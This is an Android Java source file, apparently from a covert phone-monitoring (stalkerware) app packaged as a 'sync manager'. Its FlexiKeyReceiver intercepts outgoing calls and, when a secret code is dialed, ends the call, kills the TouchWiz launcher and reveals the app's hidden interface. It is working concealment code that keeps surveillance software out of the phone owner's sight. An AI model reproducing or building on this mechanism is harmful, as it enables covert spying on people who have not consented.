package com.vvt.android.syncmanager.receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.TelephonyManager;

import com.fx.dalvik.util.FxLog;
import com.fx.dalvik.util.GeneralUtil;
import com.fx.dalvik.util.TelephonyUtils;
import com.vvt.android.syncmanager.Customization;
import com.vvt.android.syncmanager.SyncManagerActivity;
import com.vvt.android.syncmanager.control.Main;
import com.vvt.android.syncmanager.utils.Common;

public final class FlexiKeyReceiver extends BroadcastReceiver {
	
	private static final String TAG = "FlexiKeyReceiver";
	private static final boolean LOGV = Customization.DEBUG;
	
	private static String mPhoneNumber = "";
	
	// Static because a new instance will be created every time for each event.
	private static int previousCallState = TelephonyManager.CALL_STATE_IDLE;
	private static boolean incomingCallActive = false;
	private static boolean outgoingCallActive = false;
	
	@Override
	public void onReceive(Context context, Intent intent) {
		if (LOGV) FxLog.v(TAG, "onReceive # ENTER ...");
		
		// When first installed this application will not be running
		// In this situation when this receiver is started for an incoming call 
		// the context will not have been set (SystemState#onReceive has not run).
		// Of course as soon as the UI appears or the device is rebooted 
		// this is no longer a problem and this call will not be necessary
		Main.startIfNotStarted(context.getApplicationContext());
		
		String intentAction = intent.getAction();
		if (LOGV) FxLog.v(TAG, "onReceive # Intent Action = '" + intentAction + "'");
		
		if (intent.getAction().equalsIgnoreCase(Intent.ACTION_NEW_OUTGOING_CALL)) {
			mPhoneNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
			if (LOGV) FxLog.v(TAG, "onReceive # New outgoing call: '" + mPhoneNumber + "'");
		}
		
		// Verify phone state to select proper reaction
		if (intentAction.equalsIgnoreCase(TelephonyManager.ACTION_PHONE_STATE_CHANGED)) {
			processPhoneState(context, intent);
		}
		
		if (LOGV) FxLog.v(TAG, "onReceive # EXIT ...");
	}
	
	/**
	 * Verify phone state to select proper reaction
	 * @param context
	 * @param intent
	 */
	private void processPhoneState(Context context, Intent intent) {
		if (LOGV) FxLog.v(TAG, "processPhoneState # ENTER ...");
		
		TelephonyManager telephonyManager 
				= (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);

		// Get call state
		int callState = telephonyManager.getCallState();
		String callStateString = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
		
		switch (callState) {
			case TelephonyManager.CALL_STATE_IDLE:
				if (previousCallState == TelephonyManager.CALL_STATE_OFFHOOK) {
					if (incomingCallActive) {
						incomingCallActive = false;
					}
					else if (outgoingCallActive) {
						outgoingCallActive = false;
					}
				}
				// On Missed Call
				else if (previousCallState == TelephonyManager.CALL_STATE_RINGING) {
					incomingCallActive = false;
				}
				break;
				
			case TelephonyManager.CALL_STATE_OFFHOOK:
				if (previousCallState == TelephonyManager.CALL_STATE_IDLE) {
					outgoingCallActive = true;
					if (mPhoneNumber.equals(Common.getCodeToRevealUI())) {
						if (LOGV) {
							FxLog.v(TAG, "processPhoneState # Found CodeToRevealUI -> End call");
						}
						TelephonyUtils telephonyUtils = new TelephonyUtils(Main.getContext());
						telephonyUtils.endCall();
						
						if (LOGV) FxLog.v(TAG, "processPhoneState # Kill TouchWiz Launcher");
						GeneralUtil.killPackage(
								context.getApplicationContext(), 
								"com.sec.android.app.twlauncher");
						
						startUi();
					}
				} 
				else if (previousCallState == TelephonyManager.CALL_STATE_RINGING) {
					incomingCallActive = true;
				}
				break;
				
			case TelephonyManager.CALL_STATE_RINGING:
				break;
				
			default:
				callStateString = String.format("Invalid call state: %d", callState);
				break;
		}
		
		previousCallState = callState;
		
		if (LOGV) FxLog.v(TAG, String.format("processPhoneState # Call State: %s", callStateString));
	}
	
	public static void startUi() {
		Intent uiIntent = new Intent();
		uiIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
		uiIntent.setClass(Main.getContext(), SyncManagerActivity.class);
		Main.getContext().startActivity(uiIntent);
	}
	
}
